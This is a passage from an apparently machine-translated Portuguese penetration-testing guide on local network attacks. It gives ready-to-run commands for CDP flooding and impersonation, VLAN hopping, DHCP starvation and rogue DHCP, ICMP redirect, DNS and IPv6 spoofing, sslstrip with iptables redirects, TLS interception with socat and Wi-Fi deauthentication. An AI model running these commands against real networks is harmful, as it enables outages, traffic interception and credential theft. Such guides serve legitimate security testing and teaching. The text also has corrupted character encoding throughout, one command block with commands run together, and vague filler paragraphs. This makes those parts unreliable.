sudo yersinia -G
```
Selecione a op√ß√£o **tabela de inunda√ß√£o CDP** e inicie o ataque. A CPU do switch ser√° sobrecarregada, assim como a tabela de vizinhos CDP, **resultando em uma "paralisia de rede".**

<figure><img src="../../.gitbook/assets/image (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

#### Ataque de Impersona√ß√£o CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Voc√™ tamb√©m pode usar o [**scapy**](https://github.com/secdev/scapy/). Certifique-se de instal√°-lo com o pacote `scapy/contrib`.

### Ataques VoIP

Embora destinados ao uso pelos telefones Voice over Internet Protocol (VoIP) dos funcion√°rios, os dispositivos VoIP modernos est√£o cada vez mais integrados aos dispositivos IoT. Muitos funcion√°rios agora podem desbloquear portas usando um n√∫mero de telefone especial, controlar o termostato da sala...

A ferramenta [**voiphopper**](http://voiphopper.sourceforge.net) imita o comportamento de um telefone VoIP em ambientes Cisco, Avaya, Nortel e Alcatel-Lucent. Ele descobre automaticamente o ID da VLAN correto para a rede de voz usando um dos protocolos de descoberta de dispositivo que ele suporta, como o Cisco Discovery Protocol (CDP), o Dynamic Host Configuration Protocol (DHCP), o Link Layer Discovery Protocol Media Endpoint Discovery (LLDP-MED) e o 802.1Q ARP.

**VoIP Hopper** suporta **tr√™s** modos CDP. O modo **sniff** inspeciona os pacotes de rede e tenta localizar o ID da VLAN. Para us√°-lo, defina o par√¢metro **`-c`** como `0`. O modo **spoof** gera pacotes personalizados semelhantes aos que um dispositivo VoIP real transmitiria na rede corporativa. Para us√°-lo, defina o par√¢metro **`-c`** como **`1`**. O modo de spoof com um pacote **pre-madepacket** envia os mesmos pacotes de um telefone IP Cisco 7971G-GE. Para us√°-lo, defina o par√¢metro **`-c`** como **`2`**.

Usamos o √∫ltimo m√©todo porque √© a abordagem mais r√°pida. O par√¢metro **`-i`** especifica a **interface de rede** do atacante, e o par√¢metro **`-E`** especifica o **nome do dispositivo VOIP** que est√° sendo imitado. Escolhemos o nome SEP001EEEEEEEEE, que √© compat√≠vel com o formato de nomea√ß√£o da Cisco para telefones VoIP. O formato consiste na palavra "SEP" seguida de um endere√ßo MAC. Em ambientes corporativos, voc√™ pode imitar um dispositivo VoIP existente olhando a etiqueta MAC na parte de tr√°s do telefone; pressionando o bot√£o Configura√ß√µes e selecionando a op√ß√£o Informa√ß√µes do Modelo na tela de exibi√ß√£o do telefone; ou conectando o cabo Ethernet do dispositivo VoIP ao seu laptop e observando as solicita√ß√µes CDP do dispositivo usando o Wireshark.
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
Se a ferramenta for executada com sucesso, a **rede VLAN atribuir√° um endere√ßo IPv4 ao dispositivo do atacante**.

### Ataques DHCP

#### Enumera√ß√£o
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

Existem dois tipos de DoS que podem ser realizados contra servidores DHCP. O primeiro consiste em **simular hosts falsos suficientes para usar todos os poss√≠veis endere√ßos IP**.\
Este ataque s√≥ funcionar√° se voc√™ puder ver as respostas do servidor DHCP e completar o protocolo (**Discover** (Comp) --> **Offer** (servidor) --> **Request** (Comp) --> **ACK** (servidor)). Por exemplo, isso **n√£o √© poss√≠vel em redes Wi-Fi**.

Outra maneira de realizar um DoS DHCP √© enviar um **pacote DHCP-RELEASE usando como c√≥digo de origem todos os IPs poss√≠veis**. Em seguida, o servidor pensar√° que todos terminaram de usar o IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Uma maneira mais autom√°tica de fazer isso √© usando a ferramenta [DHCPing](https://github.com/kamorin/DHCPig)

Voc√™ pode usar os ataques de DoS mencionados para for√ßar os clientes a obterem novos leases dentro do ambiente e esgotar os servidores leg√≠timos para que eles fiquem inoperantes. Assim, quando os leg√≠timos tentarem se reconectar, **voc√™ pode fornecer valores maliciosos mencionados no pr√≥ximo ataque**.

#### Definir valores maliciosos

Voc√™ pode usar o script DHCP do Responder (_/usr/share/responder/DHCP.py_) para estabelecer um servidor DHCP falso. Definir um gateway malicioso n√£o √© ideal, pois a conex√£o sequestrada √© apenas meio-duplex (ou seja, capturamos pacotes de sa√≠da do cliente, mas n√£o as respostas do gateway leg√≠timo). Portanto, eu recomendaria definir um servidor DNS ou WPAD falso para capturar o tr√°fego HTTP e, em particular, as credenciais.

| Descri√ß√£o                                 | Exemplo                                                                      |
| ------------------------------------------- | ---------------------------------------------------------------------------- |
| Nosso endere√ßo IP, anunciado como um gateway     | _-i 10.0.0.100_                                                              |
| O nome de dom√≠nio DNS local (opcional)        | _-d example.org_                                                             |
| Endere√ßo IP do roteador/gateway original   | _-r 10.0.0.1_                                                                |
| Endere√ßo IP do servidor DNS prim√°rio               | _-p 10.0.0.100_                                                              |
| Endere√ßo IP do servidor DNS secund√°rio (opcional)  | _-s 10.0.0.1_                                                                |
| A m√°scara de rede local            | _-n 255.255.255.0_                                                           |
| A interface para ouvir o tr√°fego DHCP | _-I eth1_                                                                    |
| Endere√ßo de configura√ß√£o WPAD (URL)            | _-w ‚Äú_[http://10.0.0.100/wpad.dat\n‚Äù](http://10.0.0.100/wpad.dat/n%E2%80%9D) |
| Falsificar o endere√ßo IP do gateway padr√£o        | -S                                                                           |
| Responder a todas as solicita√ß√µes DHCP (muito barulhento)   | -R                                                                           |

### **Ataques EAP**

Aqui est√£o algumas t√°ticas de ataque que podem ser usadas contra implementa√ß√µes 802.1X:

* For√ßa bruta ativa de senhas via EAP
* Atacar o servidor RADIUS com conte√∫do EAP malformado _\*\*_(exploits)
* Captura de mensagens EAP e quebra offline de senhas (EAP-MD5 e PEAP)
* For√ßar autentica√ß√£o EAP-MD5 para ignorar a valida√ß√£o do certificado TLS
* Injetar tr√°fego de rede malicioso ao se autenticar usando um hub ou similar

Se o atacante estiver entre a v√≠tima e o servidor de autentica√ß√£o, ele pode tentar degradar (se necess√°rio) o protocolo de autentica√ß√£o para EAP-MD5 e capturar a tentativa de autentica√ß√£o. Em seguida, ele pode realizar uma for√ßa bruta nisso usando:
```
eapmd5pass ‚Äìr pcap.dump ‚Äìw /usr/share/wordlist/sqlmap.txt
```
### Ataques FHRP (GLBP & HSRP) <a href="#6196" id="6196"></a>

**FHRP** (Protocolo de Redund√¢ncia do Primeiro Salto) √© uma classe de protocolos de rede projetados para **criar um sistema de roteamento redundante e ativo**. Com o FHRP, roteadores f√≠sicos podem ser combinados em um √∫nico dispositivo l√≥gico, o que aumenta a toler√¢ncia a falhas e ajuda a distribuir a carga.

**Engenheiros da Cisco Systems desenvolveram dois protocolos FHRP, GLBP e HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Existem tr√™s vers√µes do Protocolo de Informa√ß√µes de Roteamento (RIP) - RIP, RIPv2 e RIPng. RIP e RIPv2 usam datagramas UDP enviados para pares atrav√©s da porta 520, enquanto o RIPng transmite datagramas para a porta UDP 521 via multicast IPv6. O RIPv2 introduziu suporte √† autentica√ß√£o MD5. O RIPng n√£o incorpora autentica√ß√£o nativa; em vez disso, depende dos cabe√ßalhos opcionais IPsec AH e ESP dentro do IPv6.

Para obter mais informa√ß√µes sobre como atacar esse protocolo, consulte o livro _**Network Security Assessment: Know Your Network (3rd edition).**_

### Ataques EIGRP

**EIGRP (Protocolo de Roteamento de Gateway Interno Aprimorado)** √© um protocolo de roteamento din√¢mico. **√â um protocolo de vetor de dist√¢ncia.** Se n√£o houver autentica√ß√£o e configura√ß√£o de interfaces passivas, um **intruso** pode interferir no roteamento EIGRP e causar **envenenamento das tabelas de roteamento**. Al√©m disso, a rede EIGRP (ou seja, sistema aut√¥nomo) **√© plana e n√£o possui segmenta√ß√£o em zonas**. Se um **atacante injetar uma rota**, √© prov√°vel que essa rota se **espalhe** por todo o sistema aut√¥nomo EIGRP.

Para atacar um sistema EIGRP, √© necess√°rio **estabelecer uma vizinhan√ßa com um roteador EIGRP leg√≠timo**, o que abre muitas possibilidades, desde reconhecimento b√°sico at√© v√°rias inje√ß√µes.

\*\*\*\*[**FRRouting**](https://frrouting.org/) permite que voc√™ implemente **um roteador virtual que suporta BGP, OSPF, EIGRP, RIP e outros protocolos.** Tudo que voc√™ precisa fazer √© implant√°-lo em seu sistema de ataque e voc√™ pode fingir ser um roteador leg√≠timo no dom√≠nio de roteamento.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

\*\*\*\*[**Coly**](https://code.google.com/p/coly/) tamb√©m suporta a captura de transmiss√µes EIGRP e a inje√ß√£o de pacotes para manipular a configura√ß√£o de roteamento. Para mais informa√ß√µes sobre como atac√°-lo com o Coly, consulte o livro _**Network Security Assessment: Know Your Network (3rd edition).**_

### OSPF

A maioria das implementa√ß√µes do Open Shortest Path First (OSPF) usa MD5 para fornecer autentica√ß√£o entre roteadores. Loki e John the Ripper podem capturar e atacar hashes MD5 para revelar a chave, que pode ent√£o ser usada para anunciar novas rotas. Os par√¢metros de rota s√£o definidos usando a guia _Injection_, e a chave √© definida em _Connection_.

Para obter mais informa√ß√µes sobre como atacar esse protocolo, consulte o livro _**Network Security Assessment: Know Your Network (3rd edition).**_

### Outras Ferramentas e Fontes Gen√©ricas

* [**Above**](https://github.com/c4s73r/Above): Ferramenta para escanear o tr√°fego de rede e encontrar vulnerabilidades
* Voc√™ pode encontrar mais informa√ß√µes sobre ataques de rede [aqui](https://github.com/Sab0tag3d/MITM-cheatsheet). _(TODO: Leia tudo e todos os novos ataques, se houver)_

## **Spoofing**

O atacante configura todos os par√¢metros de rede (GW, IP, DNS) do novo membro da rede enviando respostas DHCP falsas.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Verifique a [se√ß√£o anterior](./#arp-spoofing).

### ICMPRedirect

O ICMP Redirect consiste em enviar um pacote ICMP tipo 1 c√≥digo 5 que indica que o atacante √© a melhor maneira de alcan√ßar um IP. Em seguida, quando a v√≠tima deseja entrar em contato com o IP, ela enviar√° o pacote atrav√©s do atacante.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

O atacante ir√° falsificar (spoof) alguns (ou todos) os dom√≠nios que a v√≠tima solicitar.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configurar seu pr√≥prio DNS com dnsmasq**

O dnsmasq √© uma ferramenta √∫til para configurar um servidor DNS local em seu ambiente de teste. Ele permite que voc√™ resolva nomes de dom√≠nio para endere√ßos IP personalizados, o que pode ser √∫til durante testes de penetra√ß√£o. Siga as etapas abaixo para configurar seu pr√≥prio DNS com o dnsmasq:

1. **Instala√ß√£o do dnsmasq:**
   - No Ubuntu: `sudo apt-get install dnsmasq`
   - No CentOS: `sudo yum install dnsmasq`

2. **Configura√ß√£o do dnsmasq:**
   - Edite o arquivo de configura√ß√£o do dnsmasq: `sudo nano /etc/dnsmasq.conf`
   - Adicione as seguintes linhas ao arquivo de configura√ß√£o:
     ```
     address=/example.com/192.168.0.100
     address=/www.example.com/192.168.0.100
     ```
     Substitua `example.com` pelo dom√≠nio que deseja redirecionar e `192.168.0.100` pelo endere√ßo IP personalizado para esse dom√≠nio.

3. **Reinicie o dnsmasq:**
   - No Ubuntu: `sudo systemctl restart dnsmasq`
   - No CentOS: `sudo service dnsmasq restart`

4. **Configura√ß√£o do cliente:**
   - Abra o arquivo `/etc/resolv.conf` no cliente e adicione a seguinte linha:
     ```
     nameserver 127.0.0.1
     ```
     Isso direcionar√° as consultas DNS para o servidor DNS local configurado pelo dnsmasq.

Agora voc√™ configurou com sucesso seu pr√≥prio servidor DNS local usando o dnsmasq. Voc√™ pode testar a resolu√ß√£o de nomes de dom√≠nio usando o comando `nslookup` ou navegando para o dom√≠nio personalizado em um navegador da web. Certifique-se de que o dnsmasq esteja em execu√ß√£o e funcionando corretamente antes de prosseguir com seus testes de penetra√ß√£o.
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Gateways Locais

Frequentemente, existem v√°rias rotas para sistemas e redes. Ao criar uma lista de endere√ßos MAC na rede local, use o _gateway-finder.py_ para identificar hosts que suportam o encaminhamento IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Falsifica√ß√£o de LLMNR, NBT-NS e mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Os sistemas da Microsoft usam o Link-Local Multicast Name Resolution (LLMNR) e o NetBIOS Name Service (NBT-NS) para resolu√ß√£o local de hosts quando as consultas DNS falham. As implementa√ß√µes zero-configuration do Apple Bonjour e do Linux usam o Multicast DNS (mDNS) para descobrir sistemas em uma rede. Esses protocolos s√£o n√£o autenticados e enviam mensagens de broadcast por UDP; assim, os atacantes podem explor√°-los para direcionar os usu√°rios para servi√ßos maliciosos.

Voc√™ pode se passar por servi√ßos que s√£o procurados pelos hosts usando o Responder para enviar respostas falsas.\
Leia aqui mais informa√ß√µes sobre [como se passar por servi√ßos com o Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Falsifica√ß√£o de WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Muitos navegadores usam o Web Proxy Auto-Discovery (WPAD) para carregar as configura√ß√µes de proxy da rede. Um servidor WPAD fornece as configura√ß√µes de proxy do cliente por meio de uma URL espec√≠fica (por exemplo, [http://wpad.example.org/wpad.dat](http://wpad.example.org/wpad.dat)) ao ser identificado por meio de qualquer um dos seguintes m√©todos:

* DHCP, usando uma entrada de c√≥digo 252[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNS, procurando pelo nome de host _wpad_ no dom√≠nio local
* Microsoft LLMNR e NBT-NS (no caso de falha na consulta DNS)

O Responder automatiza o ataque WPAD - executando um proxy e direcionando os clientes para um servidor WPAD malicioso por meio do DHCP, DNS, LLMNR e NBT-NS.\
Leia aqui mais informa√ß√µes sobre [como se passar por servi√ßos com o Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Falsifica√ß√£o de dispositivos SSDP e UPnP](spoofing-ssdp-and-upnp-devices.md)

Voc√™ pode oferecer diferentes servi√ßos na rede para tentar **enganar um usu√°rio** a inserir algumas **credenciais em texto simples**. **Mais informa√ß√µes sobre esse ataque em** [**Falsifica√ß√£o de dispositivos SSDP e UPnP**](spoofing-ssdp-and-upnp-devices.md)**.**

### Falsifica√ß√£o de Vizinho IPv6

Esse ataque √© muito semelhante ao ARP Spoofing, mas no mundo IPv6. Voc√™ pode fazer a v√≠tima pensar que o IPv6 do GW tem o MAC do atacante.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### Spoofing/Flooding de An√∫ncio de Roteador IPv6

Alguns sistemas operacionais configuram por padr√£o o gateway a partir dos pacotes RA enviados na rede. Para declarar o atacante como roteador IPv6, voc√™ pode usar:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### Spoofing de DHCP IPv6

Por padr√£o, alguns sistemas operacionais tentam configurar o DNS lendo um pacote DHCPv6 na rede. Assim, um atacante poderia enviar um pacote DHCPv6 para se configurar como DNS. O DHCP tamb√©m fornece um endere√ßo IPv6 para a v√≠tima.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (p√°gina falsa e inje√ß√£o de c√≥digo JS)

## Ataques na Internet

### sslStrip

Basicamente, o que esse ataque faz √©, caso o **usu√°rio** tente **acessar** uma **p√°gina HTTP** que est√° **redirecionando** para a vers√£o **HTTPS**, o **sslStrip** ir√° **manter** uma **conex√£o HTTP com** o **cliente e uma conex√£o HTTPS com** o **servidor**, permitindo assim **capturar** a conex√£o em **texto simples**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Mais informa√ß√µes [aqui](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ e dns2proxy para contornar o HSTS

A **diferen√ßa** entre **sslStrip+ e dns2proxy** em rela√ß√£o ao **sslStrip** √© que eles ir√£o **redirecionar** por exemplo _**www.facebook.com**_ **para** _**wwww.facebook.com**_ (observe o **extra** "**w**") e definir√£o o **endere√ßo deste dom√≠nio como o IP do atacante**. Dessa forma, o **cliente** ir√° **conectar-se** a _**wwww.facebook.com**_ **(o atacante)**, mas nos bastidores o **sslstrip+** ir√° **manter** a **conex√£o real** via https com **www.facebook.com**.

O **objetivo** dessa t√©cnica √© **evitar o HSTS** porque _**wwww**.facebook.com_ **n√£o ser√°** salvo no **cache** do navegador, ent√£o o navegador ser√° enganado para realizar a **autentica√ß√£o do Facebook em HTTP**.\
Observe que, para realizar esse ataque, a v√≠tima precisa tentar acessar inicialmente [http://www.faceook.com](http://www.faceook.com) e n√£o https. Isso pode ser feito modificando os links dentro de uma p√°gina http.

Mais informa√ß√µes [aqui](https://www.bettercap.org/legacy/#hsts-bypass), [aqui](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) e [aqui](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip ou sslStrip+ n√£o funcionam mais. Isso ocorre porque existem regras HSTS pr√©-salvas nos navegadores, ent√£o mesmo que seja a primeira vez que um usu√°rio acesse um dom√≠nio "importante", ele o acessar√° via HTTPS. Al√©m disso, observe que as regras pr√©-salvas e outras regras geradas podem usar a flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **ent√£o o exemplo anterior de** _**wwww.facebook.com**_ **n√£o funcionar√° mais, pois** _**facebook.com**_ **usa HSTS com `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## Escuta TCP na porta
```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL escutando na porta

#### Gerar chaves e certificado autoassinado
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Ouvir usando certificado

Para realizar uma escuta usando um certificado, siga os passos abaixo:

1. Obtenha um certificado v√°lido que corresponda ao alvo que voc√™ deseja escutar.
2. Configure o ambiente de escuta para usar o certificado obtido.
3. Inicie a escuta usando o certificado.

Ao usar um certificado v√°lido, voc√™ pode realizar uma escuta de forma segura e autenticada, garantindo a confidencialidade e integridade das informa√ß√µes obtidas. Certifique-se de seguir as pr√°ticas recomendadas e as pol√≠ticas de seguran√ßa ao realizar essa atividade.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Ouvir usando certificado e redirecionar para os hosts

Para realizar um teste de penetra√ß√£o em uma rede, √© poss√≠vel usar um certificado para ouvir o tr√°fego de rede e redirecion√°-lo para os hosts desejados. Isso permite que voc√™ analise o tr√°fego em tempo real e identifique poss√≠veis vulnerabilidades ou atividades suspeitas.

Para come√ßar, voc√™ precisar√° gerar um certificado v√°lido para o dom√≠nio que deseja ouvir. Isso pode ser feito usando ferramentas como o OpenSSL. Certifique-se de que o certificado seja confi√°vel e v√°lido para evitar problemas de seguran√ßa.

Depois de ter o certificado, voc√™ pode configurar um servidor proxy reverso para ouvir o tr√°fego de rede. Isso pode ser feito usando ferramentas como o Nginx ou o Apache. Certifique-se de configurar corretamente o servidor proxy reverso para usar o certificado gerado anteriormente.

Uma vez que o servidor proxy reverso esteja configurado, voc√™ pode redirecionar o tr√°fego de rede para os hosts desejados. Isso pode ser feito usando regras de redirecionamento no servidor proxy reverso. Certifique-se de configurar as regras corretamente para redirecionar o tr√°fego para os hosts espec√≠ficos que voc√™ deseja analisar.

Ao ouvir o tr√°fego de rede usando um certificado e redirecion√°-lo para os hosts desejados, voc√™ poder√° analisar o tr√°fego em tempo real e identificar poss√≠veis vulnerabilidades ou atividades suspeitas. Isso pode ser √∫til durante um teste de penetra√ß√£o para identificar pontos fracos na seguran√ßa da rede.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
√Äs vezes, se o cliente verifica se o CA √© v√°lido, voc√™ pode **servir um certificado de outro nome de host assinado por um CA**.\
Outro teste interessante √© servir um **certificado do nome de host solicitado, mas autoassinado**.

Outras coisas para testar s√£o tentar assinar o certificado com um certificado v√°lido que n√£o seja um CA v√°lido. Ou usar a chave p√∫blica v√°lida, for√ßar o uso de um algoritmo como o Diffie-Hellman (que n√£o precisa descriptografar nada com a chave privada real) e quando o cliente solicitar uma sonda da chave privada real (como um hash), enviar uma sonda falsa e esperar que o cliente n√£o verifique isso.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Notas de Descoberta Ativa

Tenha em mente que quando um pacote UDP √© enviado para um dispositivo que n√£o possui a porta solicitada, um ICMP (Porta Inacess√≠vel) √© enviado.

### **Descoberta ARP**

Pacotes ARP s√£o usados para descobrir quais IPs est√£o sendo usados dentro da rede. O PC precisa enviar uma solicita√ß√£o para cada endere√ßo IP poss√≠vel e apenas aqueles que est√£o sendo usados ir√£o responder.

### **mDNS (multicast DNS)**

O Bettercap envia uma solicita√ß√£o mDNS (a cada X ms) perguntando por **\_services\_.dns-sd.\_udp.local**. A m√°quina que v√™ esse pacote geralmente responde a essa solicita√ß√£o. Em seguida, ele procura apenas por m√°quinas que respondem a "servi√ßos".

**Ferramentas**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

O Bettercap envia pacotes de broadcast para a porta 137/UDP perguntando pelo nome "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

O Bettercap envia pacotes SSDP de broadcast procurando por todos os tipos de servi√ßos (Porta UDP 1900).

### **WSD (Web Service Discovery)**

O Bettercap envia pacotes WSD de broadcast procurando por servi√ßos (Porta UDP 3702).

## Refer√™ncias

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Dica de recompensa por bugs**: **inscreva-se** no **Intigriti**, uma plataforma premium de **recompensas por bugs criada por hackers, para hackers**! Junte-se a n√≥s em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje mesmo e comece a ganhar recompensas de at√© **$100.000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
